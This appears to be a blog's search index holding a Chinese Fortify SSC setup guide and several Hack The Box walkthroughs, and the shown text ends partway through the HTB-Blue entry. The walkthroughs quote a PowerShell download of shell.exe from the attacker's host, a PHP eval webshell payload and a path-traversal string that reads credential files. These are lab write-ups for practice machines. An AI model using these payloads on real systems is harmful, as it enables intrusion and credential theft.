<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Fortify SSC 24.X 搭建</title>
    <url>/DevSecOps/tools/fortifyssc/</url>
    <content><![CDATA[<blockquote>
<p>Fortify Software Security Center 是一款基于浏览器的产品，可在整个软件开发生命周期中提供一组功能，以自动检测应用程序中的安全漏洞。它通过提供来自 OpenText™ Fortify Static Code Analyzer、OpenText™ Fortify ScanCentral SAST、OpenText™ Fortify ScanCentral DAST 和 Sonatype 的关联数据，帮助安全和开发团队协同工作，通过其协作在线环境快速准确地解决安全漏洞。</p>
</blockquote>
<span id="more"></span>

<img src="/DevSecOps/tools/fortifyssc/DraggedImage.png" class="">

<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>系统：Windows Server 2022</li>
<li>软件： Apache Tomcat 9.0.x 、 JDK 17、Fortify Software Security Center 24.2</li>
<li>数据库： MySQL 8.0.x </li>
<li>账号： 管理员权限</li>
</ul>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="安装并配置JDK环境"><a href="#安装并配置JDK环境" class="headerlink" title="安装并配置JDK环境"></a>安装并配置JDK环境</h4><p>安装JDK17，配置JDK环境变量，打开命令行输入 java、javac、java - version均有相应回显</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-1.png" class="" title="jdk环境">

<h4 id="安装并配置MySQL"><a href="#安装并配置MySQL" class="headerlink" title="安装并配置MySQL"></a>安装并配置MySQL</h4><p>安装MySQL，选择Custom</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-2.png" class="" title="安装Mysql">



<p>安装完成后修改my.ini文件(必需)</p>
<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-3.png" class="" title="my.ini">
<p>在<code>[mysqld]</code>部分修改</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>default_storage_engine</td>
<td>INNODB</td>
</tr>
<tr>
<td>innodb_buffer_pool_size</td>
<td>512M</td>
</tr>
<tr>
<td>innodb_lock_wait_timeout</td>
<td>300</td>
</tr>
<tr>
<td>innodb_log_file_size</td>
<td>512M</td>
</tr>
<tr>
<td>max_allowed_packetv</td>
<td>1G</td>
</tr>
<tr>
<td>sql-mode</td>
<td>“TRADITIONAL”</td>
</tr>
</tbody></table>
<p>保存配置，命令行重启服务（要管理员权限）</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-4.png" class="" title="重启mysql服务">

<h4 id="导入官方提供的SQL脚本"><a href="#导入官方提供的SQL脚本" class="headerlink" title="导入官方提供的SQL脚本"></a>导入官方提供的SQL脚本</h4><p>新建数据库并导入SQL脚本：数据库字符集设置为<code>utf8\\uft8\_bin</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-5.png" class="" title="新建数据库">



<p>禁用安全模式,然后重新连接数据库</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-6.png" class="" title="禁用安全模式">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-7.png" class="" title="导入sql脚本">

<h4 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h4><p>使用安装版安装Tomcat，选择full</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-8.png" class="" title="tomcat">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-9.png" class="" title="tomcat">

<h4 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h4><p>清空webapps目录，并放入ssc.war</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
<p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
<style>.ropnoyxcbhvc{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="ropnoyxcbhvc" alt="修改配置">
<style>.cbsouvvrtfxm{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="cbsouvvrtfxm">

<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">

<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-15.png" class="" title="获取token">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-16.png" class="" title="登录">

<p>上传License</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-17.png" class="" title="上传许可证">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-18.png" class="" title="默认配置">



<p>配置数据</p>
<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-19.png" class="" title="配置数据库">

<p>上传种子包，需要按顺序上传</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-20.png" class="" title="upload seed">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-21.png" class="" title="上传成功">

<p>重启Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-22.png" class="" title="重启服务">]]></content>
      <categories>
        <category>DevSecOps</category>
      </categories>
      <tags>
        <tag>企业安全建设</tag>
        <tag>DevSecOps</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Arctic</title>
    <url>/Hackthebox/htb/htb-arctic/</url>
    <content><![CDATA[<style>.oicsskymetnf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="oicsskymetnf">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-arctic/image-20250202222155508.png" class="" title="Nmap">

<p>访问10.10.10.11:8500，发现一个目录列表，找到一个后台页面 <code>/CFIDE/administrator</code> 可以看到版本是8</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203110808681.png" class="" title="目录列表">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit检索coldfusion 8 找到一个RCE，复制exp到当前目录</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111301420.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-arctic/image-20250203111746331.png" class="" title="复制文件到当前目录">

<p>修改exp里面的IP地址，然后执行脚本，成功获取到shell</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111813277.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看一下系统信息，Windows Server 2008 R2 x64 </p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203112144909.png" class="" title="信息收集">

<p>使用msf生成一个后门，利用获取到的shell 下载并执行</p>
<p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
<p>msfconsole获取shell成功</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203114209620.png" class="" title="GetShell">

<p>使用msf的ms10-092 脚本进行提权，提示报错需要x64 的meterpreter</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132850659.png" class="" title="报错">

<p>查找x64 的进程进行迁移</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132941496.png" class="" title="查看进程">

<p>迁移成功，重新执行提权脚本，成功提权</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203133216230.png" class="" title="迁移进程">

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>C:\Users\tolis\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Bastard</title>
    <url>/Hackthebox/htb/htb-bastard/</url>
    <content><![CDATA[<style>.zxwubqbzupdp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="zxwubqbzupdp">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-bastard/image-20250215103413869.png" class="" title="Nmap">

<p>开放80、135和49154端口，并且80端口发现一些目录和文件，添加域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.9 bastard.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问 <code>/CHANGELOG.txt</code> 发现 CMS 为 <code>Drupal 7.54</code> </p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215105400323.png" class="" title="信息收集">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索可用exp</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215112934416.png" class="" title="searchsploit">

<p> 修改脚本，并使用payload <code>&#39;data&#39; =&gt; &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code> ，运行脚本</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125354575.png" class="" title="修改脚本">

<img src="/Hackthebox/htb/htb-bastard/image-20250215114456579.png" class="" title="exp">

<p>配置蚁剑，连接webshell</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125510849.png" class="" title="连接webshell">

<p>将webshell转换为msfconsole，先生成exe 然后使用蚁剑上传并执行exe</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122000088.png" class="" title="生成payload">

<img src="/Hackthebox/htb/htb-bastard/image-20250215125046135.png" class="" title="上传exe并执行">

<img src="/Hackthebox/htb/htb-bastard/image-20250215122253560.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 脚本进行信息收集</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122221334.png" class="" title="收集提权信息">

<p>使用 <code>exploit/windows/local/ms15_051_client_copy_image</code> 进行权限提升</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122939518.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\dimitris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Beep</title>
    <url>/Hackthebox/htb/htb-beep/</url>
    <content><![CDATA[<style>.ermcubmccjwh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="ermcubmccjwh">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-beep/image-20250202162932802.png" class="" title="nmap">

<p>添加映射</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.10.7  beep.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/hosts</code></pre>

<p>访问<a href="https://beep.htb/">https://beep.htb</a> 发现新版火狐浏览器不支持低版本SSL，修改浏览器配置，地址栏输入<code>about:config</code> , 输入<code>security.tls.version.min</code> 修改值为1 </p>
<img src="/Hackthebox/htb/htb-beep/image-20250202170324934.png" class="" title="修改火狐配置">

<img src="/Hackthebox/htb/htb-beep/image-20250202170450821.png" class="" title="访问目标">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索Elastix ，查看<code>37637.pl</code> ,获取到payload：<code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>   搜索关键字 “AMPDBPASS” 获取到密码</p>
<img src="/Hackthebox/htb/htb-beep/image-20250202171030333.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-beep/image-20250202172215531.png" class="" title="payload">

<p>使用获取到的密码进行ssh登录，发现算法不支持，修改一下本地配置：编辑 ~&#x2F;.ssh&#x2F;config 添加</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Host *
  Ciphers +aes128-cbc
  KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
  HostKeyAlgorithms +ssh-rsa
</code></pre>

<img src="/Hackthebox/htb/htb-beep/image-20250202172249979.png" class="" title="ssh">

<img src="/Hackthebox/htb/htb-beep/image-20250202172514124.png" class="" title="修改ssh配置">

<img src="/Hackthebox/htb/htb-beep/image-20250203203836733.png" class="" title="ssh访问">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;fanis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blocky</title>
    <url>/Hackthebox/htb/htb-blocky/</url>
    <content><![CDATA[<style>.gtmetrvwdcdx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="gtmetrvwdcdx">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.37 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span>  <span class="token parameter variable">-e</span> tun0  
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">10</span>:43 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.37
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE  SERVICE   VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>   <span class="token function">ftp</span>       ProFTPD <span class="token number">1.3</span>.5a
<span class="token number">22</span>/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>       OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp    <span class="token function">open</span>   http      Apache httpd <span class="token number">2.4</span>.18
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Did not follow redirect to http://blocky.htb
<span class="token number">8192</span>/tcp  closed sophos
<span class="token number">25565</span>/tcp <span class="token function">open</span>   minecraft Minecraft <span class="token number">1.11</span>.2 <span class="token punctuation">(</span>Protocol: <span class="token number">127</span>, Message: A Minecraft Server, Users: <span class="token number">0</span>/20<span class="token punctuation">)</span>
Service Info: Host: <span class="token number">127.0</span>.1.1<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">252.53</span> seconds</code></pre>

<p>添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.37 blocky.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问网站可以看到cms为WordPress，可以在文章中找到一个用户名(notch)</p>
<img src="/Hackthebox/htb/htb-blocky/image-20250302111220868.png" class="" title="目标">

<p>使用ffuf 对目录进行扫描，访问 <a href="http://blocky.htb/plugins">http://blocky.htb/plugins</a> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://blocky.htb/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>  

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://blocky.htb/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

wiki                    <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">307</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 113ms<span class="token punctuation">]</span>
wp-content              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 130ms<span class="token punctuation">]</span>
plugins                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">310</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 125ms<span class="token punctuation">]</span>
wp-includes             <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">314</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 121ms<span class="token punctuation">]</span>
javascript              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 197ms<span class="token punctuation">]</span>
wp-admin                <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">311</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 118ms<span class="token punctuation">]</span>
phpmyadmin              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 109ms<span class="token punctuation">]</span>
server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">298</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 152ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">220546</span>/220546<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">897</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:04:56<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>

<img src="/Hackthebox/htb/htb-blocky/image-20250302110356493.png" class="" title="jar">

<p>反编译jar包发现密码<img src="/Hackthebox/htb/htb-blocky/image-20250302110940408.png" class="" title="反编译"></p>
<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><p>使用获取到的用户名(notch)和密码成功登录SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> notch@blocky.htb 
The authenticity of <span class="token function">host</span> <span class="token string">'blocky.htb (10.10.10.37)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>blocky.htb<span class="token string">' (ED25519) to the list of known hosts.
notch@blocky.htb'</span>s password: 
Welcome to Ubuntu <span class="token number">16.04</span>.2 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.4</span>.0-62-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span class="token number">7</span> packages can be updated.
<span class="token number">7</span> updates are security updates.


Last login: Fri Jul  <span class="token number">8</span> 07:16:08 <span class="token number">2022</span> from <span class="token number">10.10</span>.14.29
To run a <span class="token builtin class-name">command</span> as administrator <span class="token punctuation">(</span>user <span class="token string">"root"</span><span class="token punctuation">)</span>, use <span class="token string">"sudo &lt;command>"</span><span class="token builtin class-name">.</span>
See <span class="token string">"man sudo_root"</span> <span class="token keyword">for</span> details.

notch@Blocky:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span>,115<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>
notch@Blocky:~$ </code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo  -i 可以直接切换到root帐号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> notch: 
Matching Defaults entries <span class="token keyword">for</span> notch on Blocky:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User notch may run the following commands on Blocky:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-i</span> 
root@Blocky:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;notch&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blue</title>
    <url>/Hackthebox/htb/htb-blue/</url>
    <content><![CDATA[<style>.zbkleyfyuhwi{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="zbkleyfyuhwi">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-blue/image-20250216114713990.png" class="" title="Nmap">

<p>一个开放了445端口的Win7，直接尝试使用ms17-010 攻击目标</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块进行攻击</p>
<img src="/Hackthebox/htb/htb-blue/image-20250216120342061.png" class="" title="永恒之蓝">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
